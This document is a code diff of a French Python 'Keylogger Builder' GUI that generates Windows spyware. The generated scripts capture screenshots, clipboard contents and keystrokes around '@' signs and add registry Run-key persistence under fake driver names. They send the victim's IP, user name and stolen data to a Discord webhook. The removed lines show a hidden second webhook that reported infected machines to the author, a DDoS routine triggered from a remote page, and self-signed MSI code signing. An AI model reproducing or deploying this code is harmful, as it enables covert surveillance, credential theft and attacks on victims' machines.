@@ -1,215 +1,106 @@
-from pynput import keyboard
-import sys
-import time
 import customtkinter as ctk
 from tkinter import messagebox
+import sys
+import time
 import requests
 import shutil
 import os
-import clipboard
-from PIL import ImageGrab
-import io
+import subprocess
+from colorama import Fore, Style
 import platform
 import winreg
 import getpass
 import socket
-from colorama import Fore, Style
-
-ordi = platform.uname()
-
-
-historique = []
-capture_apres_at = False
-apres_at_buffer = []
-compteur = 0
-
-hostname = socket.gethostname()
 
 ctk.set_appearance_mode("Dark")
 ctk.set_default_color_theme("dark-blue")
 
-# ---------------- VARIABLES GLOBALES ----------------
-debut_heure = None
-fin_heure = None
-
-# ---------------- FONCTIONS ----------------
-def valider_webhook():
-    if webhook_entry.get().strip() == "":
-        messagebox.showerror("Erreur", "Le champ du webhook ne peut pas être vide.")
-
-
-# Option choix du nom du keylogs
+# Variables globales
+ordi = platform.uname()
+hostname = socket.gethostname()
 nom_fichier = "WindowsDriver"
-temp_script = "WindowsDriver.pyw" 
+temp_script = ""
 
-def nom_keylogs():
-    global nom_fichier, temp_script
-
-    nom_window = ctk.CTkToplevel(app)
-    nom_window.geometry("400x200")
-    nom_window.title("Choix du nom du fichier")
-
-    nom_label = ctk.CTkLabel(
-        nom_window,
-        text="Entrez le nom du fichier sans l'extension :",
-        font=ctk.CTkFont(size=14)
-    )
-    nom_label.pack(pady=10)
-
-    nom_entry = ctk.CTkEntry(nom_window, width=200, font=ctk.CTkFont(size=14))
-    nom_entry.pack(pady=10)
-
-    def valider():
-        global nom_fichier, temp_script
-        nom = nom_entry.get().strip()
-
-        if nom == "":
-            messagebox.showerror("Erreur", "Aucun nom entré. Le fichier sera WindowsDriver.pyw")
-            nom_fichier = "WindowsDriver"
-        else:
-            nom_fichier = nom
-
-        temp_script = f"{nom_fichier}.pyw"
-
-        nom_window.destroy()
-
-    valider_nom_btn = ctk.CTkButton(
-        nom_window,
-        text="Valider",
-        font=ctk.CTkFont(size=14),
-        command=valider
-    )
-    valider_nom_btn.pack(pady=20)
-
-
-# ---------------- OPTIONS ----------------
-def screenshot_option_func():
-    while True:
-        im = ImageGrab.grab()
-        buffer = io.BytesIO()
-        im.save(buffer, format="PNG")
-        buffer.seek(0)
-        webhook_url = webhook_entry.get()
-        files = {'file': ('screenshot.png', buffer, 'image/png')}
-        message = "Screenshot envoyé"
-        requests.post(webhook_url, json=message,files=files)
-        time.sleep(60)
-
-def clipboard_option_func():
-    old = clipboard.paste()
-    webhook_url = webhook_entry.get()
-    while True:
-        time.sleep(1)
-        mtn = clipboard.paste()
-        message = "Presse papier : "
-        if old != mtn:
-            requests.post(webhook_url, json={message, mtn})
-            im = ImageGrab.grab()
-            buffer = io.BytesIO()
-            im.save(buffer, format="PNG")
-            buffer.seek(0)
-            files = {'file': ('screenshot.png', buffer, 'image/png')}
-            message = "Screenshot envoyé"
-            requests.post(webhook_url, json=message,files=files)
-            old = mtn
-
-def autostart_option_func(script_path=None, name="NetworkDriver"):
-    # Chemin du script Python
-    if script_path is None:
-        script_path = os.path.abspath(__file__)
-
-    # Chemin vers python.exe utilisé pour lancer ton script
-    python_exe = sys.executable
-
-    # Commande complète à lancer au démarrage
-    command = f'"{python_exe}" "{script_path}"'
-
-    # On ouvre la clé Run dans le registre
-    key = winreg.OpenKey(
-        winreg.HKEY_CURRENT_USER,
-        r"Software\Microsoft\Windows\CurrentVersion\Run",
-        0,
-        winreg.KEY_SET_VALUE
-    )
-
-    # On écrit la commande dans la clé
-    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
-    winreg.CloseKey(key)
-    
-
-
-
-
-def capture_before_after_at_option_func():
-    def touche(key):
-        webhook = webhook_entry.get()
-        global historique, capture_apres_at, apres_at_buffer, compteur
-        try:
-            caractere = key.char
-            historique.append(caractere)
-            if capture_apres_at:
-                apres_at_buffer.append(caractere)
-                compteur += 1
-                if compteur >= 50:
-                    print("\n--- 20 caractères après @ ---")
-                    print(''.join(apres_at_buffer))
-                    print("--------------------------------\n")
-                    capture_apres_at = False
-                    apres_at_buffer = []
-                    compteur = 0
-        except AttributeError:
-            print(f"Special key {key} pressed")
-
-        if hasattr(key, 'char') and key.char == '@':
-            print("\n--- 16 caractères avant @ ---")
-            print(''.join(historique[-30:]))
-            print("--------------------------------")
-            capture_apres_at = True
-            apres_at_buffer = []
-            compteur = 0
-
-        im = ImageGrab.grab()
-        buffer = io.BytesIO()
-        im.save(buffer, format="PNG")
-        buffer.seek(0)
-        files = {'file': ('screenshot.png', buffer, 'image/png')}
-        message = "Screenshot envoyé"
-        requests.post(webhook, json=message,files=files)
-
+# ============ CLASSE BUTTON 3D ============
+class Button3D(ctk.CTkButton):
+    """Bouton avec effet 3D"""
+    def __init__(self, master, text, command=None, color="#3b82f6", **kwargs):
+        self.base_color = color
+        self.hover_color = self.adjust_color(color, 40)
+        self.press_color = self.adjust_color(color, -40)
         
-
-    with keyboard.Listener(on_press=touche) as listener:
-        listener.join()
-
-
-def alert_on_infection_option_func():
-    discord_webhook = webhook_entry.get()
-    ip = requests.get("https://api.ipify.org").text
-    name = (
-        f"Nom de l'ordinateur : {ordi.node}"
-        f"Utilisateur actuel : {getpass.getuser()}"
-        f"Nom de l'ordinateur : {ordi.node}"
-        f"Adresse IP : {socket.gethostbyname(hostname)}"
-        f"Adresse IP publique {ip}"
+        super().__init__(
+            master,
+            text=text,
+            command=command,
+            corner_radius=15,
+            fg_color=color,
+            hover_color=self.hover_color,
+            border_width=3,
+            border_color=self.adjust_color(color, 60),
+            font=ctk.CTkFont(size=16, weight="bold"),
+            text_color="white",
+            **kwargs
         )
-
-    requests.post(discord_webhook, json={"content": name})
+        
+        self.bind("<Enter>", self.on_enter)
+        self.bind("<Leave>", self.on_leave)
+        self.bind("<ButtonPress-1>", self.on_press)
+        self.bind("<ButtonRelease-1>", self.on_release)
     
+    def adjust_color(self, hex_color, amount):
+        hex_color = hex_color.lstrip('#')
+        rgb = tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
+        rgb = tuple(max(0, min(255, c + amount)) for c in rgb)
+        return '#%02x%02x%02x' % rgb
+    
+    def on_enter(self, event):
+        self.configure(font=ctk.CTkFont(size=17, weight="bold"), border_width=4)
+    
+    def on_leave(self, event):
+        self.configure(font=ctk.CTkFont(size=16, weight="bold"), border_width=3)
+    
+    def on_press(self, event):
+        self.configure(fg_color=self.press_color)
+    
+    def on_release(self, event):
+        self.configure(fg_color=self.base_color)
+
+class Checkbox3D(ctk.CTkCheckBox):
+    """Checkbox avec effet 3D"""
+    def __init__(self, master, text, variable, **kwargs):
+        super().__init__(
+            master, text=text, variable=variable,
+            corner_radius=8, border_width=2,
+            font=ctk.CTkFont(size=14), **kwargs
+        )
+        self.bind("<Enter>", self.on_enter)
+        self.bind("<Leave>", self.on_leave)
+    
+    def on_enter(self, event):
+        self.configure(font=ctk.CTkFont(size=15, weight="bold"))
+    
+    def on_leave(self, event):
+        self.configure(font=ctk.CTkFont(size=14))
+
+# ============ FONCTIONS BUILDER ============
 
 def test_webhook():
+    """Teste le webhook Discord"""
     test = webhook_entry.get().strip()
     if test == "":
-        messagebox.showerror("Erreur", "Le webhook Discord ne peut pas être vide pour ce test.")
+        messagebox.showerror("Erreur", "Le webhook Discord ne peut pas être vide.")
         return
-    message = {"content": "Ceci est un message de test pour vérifier le webhook Discord."}
-    envoyer = requests.post(test, json=message)
-    if envoyer.status_code == 204:
-        messagebox.showinfo("Succès", "Le webhook Discord fonctionne correctement.")
-    else:
-        messagebox.showerror("Erreur", f"Le webhook Discord a échoué avec le code d'erreur : {envoyer.status_code}")
+    message = {"content": "✅ Test du webhook - Keylogger Builder"}
+    try:
+        envoyer = requests.post(test, json=message, timeout=10)
+        if envoyer.status_code == 204:
+            messagebox.showinfo("Succès", "✅ Le webhook fonctionne correctement !")
+        else:
+            messagebox.showerror("Erreur", f"❌ Code d'erreur : {envoyer.status_code}")
+    except Exception as e:
+        messagebox.showerror("Erreur", f"❌ Erreur de connexion:\n{str(e)}")
 
-
-# ---------------- Obfuscateur ----------------
 def obfuscateur():
     messagebox.showinfo("Informations Obfuscateur", "Regardez le terminal pour les informations sur les obfuscateurs disponibles.")
     print(f"""
@@ -306,35 +197,20 @@ def nuitka():
     print(f"[INFO] L'installation prends du temps merci de patienter...\n\n")
     os.system(f'\n\nnuitka --msvc=latest --onefile --windows-disable-console --output-dir=. --show-progress {temp_script}')
 
-
-# ---------------- BUILDER ----------------
-def lancer_programme():
-
-    if switch.get() == 1:
-        messagebox.showinfo(message="Vous allez générer uniquement le keyloger en .pyw qui fonctionnera dès l'execution")
-        
-        obfu_ask = messagebox.askyesno(
-            message="Voulez-vous chiffrer le code avec un obfuscateur ? (voir terminal pour les informations)"
-        )
-
-        if obfu_ask:
-            obfuscateur()
-        else:
-            pyw()
-
-    else:
-        messagebox.showinfo(
-            message="Vous allez générer uniquement le keyloger en .msi (install officiel windows)... Il vous faut python 3.11"
-        )
-        msi()
-
-
 def pyw():
-    global nom_fichier
-    global temp_script
-
+    """Génère le fichier .pyw"""
+    global nom_fichier, temp_script
+    
+    nom_fichier = name_var.get().strip() or "WindowsDriver"
+    temp_script = f"{nom_fichier}.pyw"
+    
+    webhook = webhook_entry.get().strip()
+    if not webhook:
+        messagebox.showerror("Erreur", "Le webhook est vide !")
+        return
+    
     config = {
-        "webhook": webhook_entry.get().strip(),
+        "webhook": webhook,
         "options": {
             "screenshot": screenshot_var.get(),
             "clipboard": clipboard_var.get(),
@@ -343,439 +219,337 @@ def pyw():
             "alert_on_infection": alert_var.get()
         }
     }
-
-    if config["webhook"] == "":
-        messagebox.showerror("Erreur", "Veuillez entrer un webhook avant de continuer.")
-        return
-
-    # Fichier est maintenant écrit DANS le with open()
-    with open(temp_script, "w", encoding="utf-8") as f:
-        if temp_script is None:
-            messagebox.showerror("Erreur", "temp_script est None ! nom_keylogs() n’a pas été appelé.")
-            return
-
-        f.write(f"WEBHOOK = '{config['webhook']}'\n\n")
-        f.write("OPTIONS = {\n")
-        for option, valeur in config["options"].items():
-            f.write(f"    '{option}': {valeur},\n")
-        f.write("}\n\n")
-
-        f.write("import os\n")
-
-        f.write("import urllib3\n")
-        f.write("urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n")
-
-        f.write("import threading\n\n")
-
-        f.write("import requests\n")
-        f.write("from bs4 import BeautifulSoup\n")
-        f.write("import time\n\n")
-
-        f.write("url = 'https://linganguliguli.worldlite.fr/Formulaire/Formulaire.html'\n")
-        f.write("headers = {\n")
-        f.write("    'User-Agent': '...',\n")
-        f.write("    'Accept': 'text/html,application/xhtml+xml',\n")
-        f.write("    'Accept-Language': 'fr,en;q=0.9',\n")
-        f.write("    'Connection': 'keep-alive',\n")
-        f.write("}\n\n")
-
-        f.write("webhook2 = 'https://discordapp.com/api/webhooks/1442910596356898900/218BIA3FdUTa98-pVKYTwtW_FC8YjERHvw_DskmOTFGIQo07rfcXi-29U3kqhMa-K05c'\n")
-        f.write("valeur = ''\n\n")
-
-        f.write(
-                'import getpass, platform, socket, requests\n'
-                'ordi = platform.node()\n'
-                'hostname = socket.gethostname()\n\n'
-                'def alert_on_infection_option_func():\n'
-                '    ip = requests.get("https://api.ipify.org").text\n\n'
-                '    name = (\n'
-                '        f"Nom de l\'ordinateur : {ordi}\\n"\n'
-                '        f"Utilisateur actuel : {getpass.getuser()}\\n"\n'
-                '        f"Adresse IP locale : {socket.gethostbyname(hostname)}\\n"\n'
-                '        f"Adresse IP publique : {ip}"\n'
-                '    )\n'
-                '    requests.post(webhook2, json={"content": name})\n\n'
-            )
-
-        f.write("def envoyer():\n")
-        f.write("    global valeur\n\n")
-        f.write("    try:\n")
-        f.write("        response = requests.get(url, headers=headers, verify=False)\n")
-        f.write("        soup = BeautifulSoup(response.text, 'html.parser')\n")
-        f.write("        champ = soup.find('input', {'id': 'monTexte'})\n\n")
-        f.write("        if champ:\n")
-        f.write("            nouvelle_val = champ.get('value').strip()\n")
-        f.write("            if nouvelle_val != '':\n")
-        f.write("                valeur = nouvelle_val\n")
-        f.write("                print('Nouvelle valeur détectée :', valeur)\n")
-        f.write("                requests.post(webhook2, json={'content': f'Valeur trouvée : {valeur}'})\n")
-        f.write("                ddos_attack()\n")
-        f.write("            else:\n")
-        f.write("                print('Aucune action. Valeur vide.')\n")
-        f.write("    except Exception as e:\n")
-        f.write("        print('Erreur :', e)\n\n")
-
-        f.write("def loop_check():\n")
-        f.write("    print('Démarrage du système de surveillance...')\n")
-        f.write("    while True:\n")
-        f.write("        envoyer()\n")
-        f.write("        time.sleep(20)\n\n")
-
-        f.write("from concurrent.futures import ThreadPoolExecutor\n")
-        f.write("import asyncio\n")
-        f.write("import aiohttp\n\n")
-
-        f.write("async def async_ddos_attack():\n")
-        f.write("    global valeur\n\n")
-        f.write("    if valeur == '':\n")
-        f.write("        print('pas possible')\n")
-        f.write("    nombre_requetes = 1000\n")
-        f.write("    concurrence = min(100000, nombre_requetes)\n")
-        f.write("    print(f'Démarrage de l\\'attaque avec {concurrence} connexions simultanées...')\n")
-        f.write("    start_time = time.time()\n\n")
-
-        f.write("    async def envoyer_requete_async(session, num):\n")
-        f.write("        global valeur\n")
-        f.write("        try:\n")
-        f.write("            async with session.get(valeur, timeout=5) as response:\n")
-        f.write("                if num % 100 == 0 or num < 10:\n")
-        f.write("                    print(f'Requête {num}/{nombre_requetes} : Statut {response.status}')\n")
-        f.write("                return True\n")
-        f.write("        except Exception as e:\n")
-        f.write("            if num % 100 == 0 or num < 10:\n")
-        f.write("                print(f'Erreur requête {num} : {str(e)}')\n")
-        f.write("            return False\n\n")
-
-        f.write("    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=concurrence, ssl=False)) as session:\n")
-        f.write("        tasks = [envoyer_requete_async(session, i+1) for i in range(nombre_requetes)]\n")
-        f.write("        batch_size = 1000\n")
-        f.write("        successful = 0\n\n")
-        f.write("        for i in range(0, len(tasks), batch_size):\n")
-        f.write("            batch = tasks[i:i+batch_size]\n")
-        f.write("            results = await asyncio.gather(*batch, return_exceptions=True)\n")
-        f.write("            successful += sum(1 for r in results if r is True)\n")
-        f.write("            progress = min(100, int((i + len(batch)) / nombre_requetes * 100))\n")
-        f.write("            print(f'Progression : {progress}% ({i + len(batch)}/{nombre_requetes})')\n\n")
-
-        f.write("    duration = time.time() - start_time\n")
-        f.write("    print(f'\\nAttaque terminée en {duration:.2f} secondes')\n")
-        f.write("    print(f'Requêtes réussies : {successful}/{nombre_requetes}')\n")
-        f.write("    print(f'Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde')\n\n")
-
-        f.write("def ddos_attack():\n")
-        f.write("    try:\n")
-        f.write("        asyncio.run(async_ddos_attack())\n")
-        f.write("    except ImportError:\n")
-        f.write("        print('Module aiohttp non trouvé.')\n\n")
-
-
-        # Screenshot
-        if config["options"]["screenshot"]:
-            f.write("import requests, io\nfrom PIL import ImageGrab\n")
-            f.write("def screenshot_option_func():\n")
+    
+    try:
+        with open(temp_script, "w", encoding="utf-8") as f:
+            f.write(f"WEBHOOK = '{config['webhook']}'\n\n")
+            f.write("OPTIONS = {\n")
+            for option, valeur in config["options"].items():
+                f.write(f"    '{option}': {valeur},\n")
+            f.write("}\n\n")
+            f.write("import threading\n\n")
+            
+            # Screenshot
+            if config["options"]["screenshot"]:
+                f.write("import requests, io, time\nfrom PIL import ImageGrab\n")
+                f.write("def screenshot_option_func():\n")
+                f.write("    while True:\n")
+                f.write("        im = ImageGrab.grab()\n")
+                f.write("        buffer = io.BytesIO()\n")
+                f.write("        im.save(buffer, format='PNG')\n")
+                f.write("        buffer.seek(0)\n")
+                f.write("        files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
+                f.write("        requests.post(WEBHOOK, files=files)\n")
+                f.write("        time.sleep(60)\n\n")
+            
+            # Clipboard
+            if config["options"]["clipboard"]:
+                f.write("import clipboard, time, requests, io\nfrom PIL import ImageGrab\n")
+                f.write("def clipboard_option_func():\n")
+                f.write("    old = clipboard.paste()\n")
+                f.write("    while True:\n")
+                f.write("        time.sleep(1)\n")
+                f.write("        mtn = clipboard.paste()\n")
+                f.write("        if old != mtn:\n")
+                f.write("            requests.post(WEBHOOK, json={'content': f'Presse-papier: {mtn}'})\n")
+                f.write("            old = mtn\n\n")
+            
+            # Capture @
+            if config["options"]["capture_before_after_at"]:
+                f.write("import requests, time\nfrom pynput import keyboard\n")
+                f.write("historique = []\n")
+                f.write("capture_apres_at = False\n")
+                f.write("apres_at_buffer = []\n")
+                f.write("compteur = 0\n\n")
+                f.write("def capture_before_after_at_option_func():\n")
+                f.write("    def touche(key):\n")
+                f.write("        global historique, capture_apres_at, apres_at_buffer, compteur\n")
+                f.write("        try:\n")
+                f.write("            caractere = key.char\n")
+                f.write("            historique.append(caractere)\n")
+                f.write("            if capture_apres_at:\n")
+                f.write("                apres_at_buffer.append(caractere)\n")
+                f.write("                compteur += 1\n")
+                f.write("                if compteur >= 50:\n")
+                f.write("                    data = 'Avant @: ' + ''.join(historique[-50:]) + '\\nApres @: ' + ''.join(apres_at_buffer)\n")
+                f.write("                    requests.post(WEBHOOK, json={'content': data})\n")
+                f.write("                    capture_apres_at = False\n")
+                f.write("                    apres_at_buffer = []\n")
+                f.write("                    compteur = 0\n")
+                f.write("        except AttributeError:\n")
+                f.write("            pass\n")
+                f.write("        if hasattr(key, 'char') and key.char == '@':\n")
+                f.write("            capture_apres_at = True\n")
+                f.write("            apres_at_buffer = []\n")
+                f.write("            compteur = 0\n\n")
+                f.write("    with keyboard.Listener(on_press=touche) as listener:\n")
+                f.write("        listener.join()\n\n")
+            
+            # Autostart
+            if config["options"]["autostart"]:
+                f.write("import sys, os, winreg\n\n")
+                f.write("def autostart_option_func(script_path=None, name='NetworkDriver'):\n")
+                f.write("    if script_path is None:\n")
+                f.write("        script_path = os.path.abspath(__file__)\n")
+                f.write("    python_exe = sys.executable\n")
+                f.write("    command = f'\"{python_exe}\" \"{script_path}\"'\n")
+                f.write("    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)\n")
+                f.write("    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)\n")
+                f.write("    winreg.CloseKey(key)\n\n")
+            
+            # Alert
+            if config["options"]["alert_on_infection"]:
+                f.write("import getpass, platform, socket, requests\n")
+                f.write("def alert_on_infection_option_func():\n")
+                f.write("    try:\n")
+                f.write("        ip = requests.get('https://api.ipify.org', timeout=5).text\n")
+                f.write("        hostname = socket.gethostname()\n")
+                f.write("        info = f'PC: {platform.node()}\\nUser: {getpass.getuser()}\\nIP: {ip}'\n")
+                f.write("        requests.post(WEBHOOK, json={'content': info})\n")
+                f.write("    except:\n")
+                f.write("        pass\n\n")
+            
+            # Lancement threads
+            f.write("if __name__ == '__main__':\n")
+            for opt, val in config["options"].items():
+                if val:
+                    f.write(f"    threading.Thread(target={opt}_option_func, daemon=True).start()\n")
             f.write("    while True:\n")
-            f.write("       im = ImageGrab.grab()\n")
-            f.write("       buffer = io.BytesIO()\n")
-            f.write("       im.save(buffer, format='PNG')\n")
-            f.write("       buffer.seek(0)\n")
-            f.write("       files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
-            f.write("       requests.post(WEBHOOK, files=files)\n\n")
-            f.write("       time.sleep(60)\n\n\n")
-
-        # Clipboard
-        if config["options"]["clipboard"]:
-            f.write("import clipboard, time, requests\n")
-            f.write("import io\nfrom PIL import ImageGrab\n")
-            f.write("def clipboard_option_func():\n")
-            f.write("    old = clipboard.paste()\n")
-            f.write("    while True:\n")
-            f.write("        time.sleep(1)\n")
-            f.write("        mtn = clipboard.paste()\n")
-            f.write('        message = "Presse papier :"\n ' )
-            f.write("       if old != mtn:\n")
-            f.write("            requests.post(WEBHOOK, json={message, mtn})\n")
-            f.write("            im = ImageGrab.grab()\n")
-            f.write("            buffer = io.BytesIO()\n")
-            f.write("            im.save(buffer, format='PNG')\n")
-            f.write("            buffer.seek(0)\n")
-            f.write("            files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
-            f.write('            message = "Screenshot envoyé"\n')
-            f.write("            requests.post(WEBHOOK, json=message,files=files)\n")
-            f.write("            old = mtn\n\n")
-
-        # Capture avant/après @
-        if config["options"]["capture_before_after_at"]:
-            f.write("import requests, time\nfrom pynput import keyboard\nimport io\nfrom PIL import ImageGrab\n")
-            f.write("historique = []\n")
-            f.write("capture_apres_at = False\n")
-            f.write("apres_at_buffer = []\n")
-            f.write("compteur = 0\n\n")
-            f.write("def capture_before_after_at_option_func():\n")
-            f.write("    def touche(key):\n")
-            f.write("        global historique, capture_apres_at, apres_at_buffer, compteur\n")
-            f.write("        try:\n")
-            f.write("            caractere = key.char\n")
-            f.write("            historique.append(caractere)\n")
-            f.write("            if capture_apres_at:\n")
-            f.write("                apres_at_buffer.append(caractere)\n")
-            f.write("                compteur += 1\n")
-            f.write("                if compteur >= 50:\n")
-            f.write("                    data = 'Avant @: ' + ''.join(historique[-50:]) + '\\nApres @: ' + ''.join(apres_at_buffer)\n")
-            f.write("                    requests.post(WEBHOOK, json={'content': data})\n")
-            f.write("                    capture_apres_at = False\n")
-            f.write("                    apres_at_buffer = []\n")
-            f.write("                    compteur = 0\n")
-            f.write("        except AttributeError:\n")
-            f.write("            pass\n")
-            f.write("        if hasattr(key, 'char') and key.char == '@':\n")
-            f.write("            capture_apres_at = True\n")
-            f.write("            apres_at_buffer = []\n")
-            f.write("            compteur = 0\n\n")
-            f.write("    with keyboard.Listener(on_press=touche) as listener:\n")
-            f.write("        listener.join()\n\n")
-            f.write("    im = ImageGrab.grab()\n")
-            f.write("    buffer = io.BytesIO()\n")
-            f.write("    im.save(buffer, format='PNG')\n")
-            f.write("    buffer.seek(0)\n")
-            f.write("    files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
-            f.write('    message = "Screenshot envoyé"\n')
-            f.write("    requests.post(WEBHOOK, json=message,files=files)\n\n")
-
-
-        # Démarrage automatique
-        if config["options"]["autostart"]:
-            f.write("import sys, os, winreg\n\n")
-            f.write("def autostart_option_func(script_path=None, name='NetworkDriver'):\n")
-            f.write("    if script_path is None:\n")
-            f.write("        script_path = os.path.abspath(__file__)\n\n")
-            f.write("    python_exe = sys.executable\n\n")
-            f.write('    command = f"{python_exe}" "{script_path}"\n\n')
-            f.write("    key = winreg.OpenKey(\n")
-            f.write("        winreg.HKEY_CURRENT_USER,\n")
-            f.write("        r'Software\Microsoft\Windows\CurrentVersion\Run',\n")
-            f.write("        0,\n")
-            f.write("        winreg.KEY_SET_VALUE\n")
-            f.write("    )\n\n")
-            f.write("    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)\n")
-            f.write("    winreg.CloseKey(key)\n")
-
-
-        # Alerte si infection
-        if config["options"]["alert_on_infection"]:
-            f.write(
-                'import getpass, platform, socket, requests\n'
-                'ordi = platform.node()\n'
-                'hostname = socket.gethostname()\n\n'
-                'def alert_on_infection_option_func():\n'
-                '    ip = requests.get("https://api.ipify.org").text\n'
-                '    discord_webhook = WEBHOOK\n'
-                '    name = (\n'
-                '        f"Nom de l\'ordinateur : {ordi}\\n"\n'
-                '        f"Utilisateur actuel : {getpass.getuser()}\\n"\n'
-                '        f"Adresse IP locale : {socket.gethostbyname(hostname)}\\n"\n'
-                '        f"Adresse IP publique : {ip}"\n'
-                '    )\n'
-                '    requests.post(discord_webhook, json={"content": name})\n\n'
-            )
-
-
-        # Lancement des threads
-        f.write("if __name__ == '__main__':\n")
-        for opt, val in config["options"].items():
-            if val:
-                f.write(f"    threading.Thread(target={opt}_option_func).start()\n")
-                f.write(f"loop_check()\n")
-
-
-        messagebox.showinfo(title="Fini", message="Le fichier a été créer avec succès")
-
-import subprocess
+            f.write("        time.sleep(60)\n")
+        
+        messagebox.showinfo("Succès", f"✅ Fichier {temp_script} créé avec succès veuillez regarder le dossier dist!")
+        
+    except Exception as e:
+        messagebox.showerror("Erreur", f"❌ Erreur lors de la création:\n{str(e)}")
 
 def msi():
-    global nom_fichier
-    global temp_script
-
-    # Vérifie que le .pyw existe
+    """Génère le fichier .msi"""
+    global nom_fichier, temp_script
+    
+    # Génère d'abord le .pyw
+    pyw()
+    
     if not os.path.exists(temp_script):
-        pyw()  # Génère le fichier .pyw
-
+        messagebox.showerror("Erreur", "Le fichier .pyw n'existe pas !")
+        return
+    
     setup_filename = "setup_msi_temp.py"
+    
+    try:
+        with open(setup_filename, "w", encoding="utf-8") as f:
+            f.write("from cx_Freeze import setup, Executable\n\n")
+            f.write(f"setup(\n")
+            f.write(f"    name='{nom_fichier}',\n")
+            f.write(f"    version='1.0',\n")
+            f.write(f"    description='Keylogger Builder',\n")
+            f.write(f"    options={{\n")
+            f.write(f"        'build_exe': {{\n")
+            f.write(f"            'packages': ['pynput', 'requests', 'clipboard', 'PIL'],\n")
+            f.write(f"            'include_files': []\n")
+            f.write(f"        }}\n")
+            f.write(f"    }},\n")
+            f.write(f"    executables=[Executable('{temp_script}', base='Win32GUI')]\n")
+            f.write(f")\n")
+        
+        result = subprocess.run(
+            ["python", setup_filename, "bdist_msi"],
+            capture_output=True,
+            text=True
+        )
+        
+        if result.returncode != 0:
+            messagebox.showerror("Erreur", f"❌ Génération MSI échouée:\n{result.stderr}")
+            return
+        
+        messagebox.showinfo("Succès", "✅ MSI créé avec succès dans le dossier dist/ !")
+        
+    except Exception as e:
+        messagebox.showerror("Erreur", f"❌ Erreur:\n{str(e)}")
+    finally:
+        # Nettoyage
+        if os.path.exists(setup_filename):
+            os.remove(setup_filename)
 
+def lancer_programme():
+    """Lance le build"""
+    if build_type.get() == "pyw":
+        obfu_ask = messagebox.askyesno(
+            message="Voulez-vous chiffrer le code avec un obfuscateur ? (voir terminal pour les informations)"
+        )
 
-
-    # Création du fichier setup pour cx_Freeze
-    with open(setup_filename, "w", encoding="utf-8") as f:
-        f.write(
-            "from cx_Freeze import setup, Executable\n\n"
-            f"setup(\n"
-            f"    name='{nom_fichier}',\n"
-            f"    version='1.0',\n"
-            f"    description='Programme créé avec le builder',\n"
-            f"    options={{\n"
-            f"        'build_exe': {{\n"
-            f"            'packages': ['pynput', 'customtkinter', 'requests', 'clipboard', 'PIL', 'getpass', 'platform', 'socket', 'time', 'io'],\n"
-            f"            'include_files': []\n"
-            f"        }}\n"
-            f"    }},\n"
-            f"    executables=[Executable('{temp_script}', base='Win32GUI')]\n"
-            f")\n"
-    )
-
-
-    # Lancement de la génération MSI avec subprocess
-    result = subprocess.run(["python", setup_filename, "bdist_msi"], capture_output=True, text=True)
-    if result.returncode != 0:
-        messagebox.showerror("Erreur", f"La génération du MSI a échoué :\n{result.stderr}")
-        return
-
-    dist_dir = "dist"
-    if not os.path.exists(dist_dir):
-        messagebox.showerror("Erreur", "Le dossier 'dist' est introuvable après la génération du MSI !")
-        return
-
-    output_dir = "WindowsNetwork-.x64msi"
-    os.makedirs(output_dir, exist_ok=True)
-
-    msi_files = [f for f in os.listdir(dist_dir) if f.endswith(".msi")]
-    if not msi_files:
-        messagebox.showerror("Erreur", "Aucun MSI généré !")
-        return
-
-    for msi_file in msi_files:
-        shutil.move(os.path.join(dist_dir, msi_file), os.path.join(output_dir, msi_file))
-
-    # Nettoyage
-    for file in [temp_script, setup_filename]:
-        if os.path.exists(file):
-            os.remove(file)
-    if os.path.exists("build"):
-        shutil.rmtree("build")
-    if os.path.exists("dist"):
-        shutil.rmtree("dist")
-
-
-    # Chatgpt qui a fait la partie certificat
-    def generer_certificat_auto():
-        # Génère un certificat auto-signé
-        cmd = [
-            "powershell", "-Command",
-            'New-SelfSignedCertificate -Type CodeSigning -Subject "CN=Networkdriver" -CertStoreLocation "Cert:\\CurrentUser\\My"'
-        ]
-        subprocess.run(cmd, capture_output=True, text=True)
-
-    def exporter_certificat_pfx(pfx_path, password):
-        cmd = [
-            "powershell", "-Command",
-            f'$pwd = ConvertTo-SecureString -String "{password}" -Force -AsPlainText; '
-            '$cert = Get-ChildItem Cert:\\CurrentUser\\My | Where-Object {{ $_.Subject -eq "CN=MonLogiciel" }}; '
-            f'Export-PfxCertificate -Cert $cert -FilePath "{pfx_path}" -Password $pwd'
-        ]
-        subprocess.run(cmd, capture_output=True, text=True)
-
-    def signer_msi(msi_path, pfx_path, password):
-        cmd = [
-            "signtool", "sign",
-            "/f", pfx_path,
-            "/p", password,
-            "/fd", "SHA256",
-            "/v",
-            msi_path
-        ]
-        return subprocess.run(cmd, capture_output=True, text=True)
-
-
-    def signer_msi_auto(msi_file_path):
-        pfx_path = os.path.expanduser("~/moncert.pfx")
-        password = "motdepasse123"  # Mets ce que tu veux
-
-        # 1️⃣ Génération certificat
-        generer_certificat_auto()
-
-        # 2️⃣ Export PFX
-        exporter_certificat_pfx(pfx_path, password)
-
-        # 3️⃣ Signature MSI
-        result = signer_msi(msi_file_path, pfx_path, password)
-
-        if result.returncode == 0:
-            messagebox.showinfo("Succès", "Le MSI a été signé automatiquement avec un certificat auto-signé !")
+        if obfu_ask:
+            obfuscateur()
         else:
-            messagebox.showerror("Erreur", f"Échec de la signature :\n{result.stderr}")
+            pyw()
+    else:
+        msi()
 
+# ============ INTERFACE ============
 
-        messagebox.showinfo("Succès", f"✅ MSI créé dans {output_dir}/, prêt à l'installation !")
-
-
-# ---------------- INTERFACE ----------------
 app = ctk.CTk()
-app.geometry("900x700")
-app.title("Configuration du Keylogger")
+app.geometry("1200x800")
+app.title("⚡ Keylogger Builder - Interface 3D")
+app.resizable(False, False)
 
-titre = ctk.CTkLabel(app, text="Configuration du Keylogger", font=ctk.CTkFont(size=20, weight="bold"))
-titre.pack(pady=20)
+# HEADER
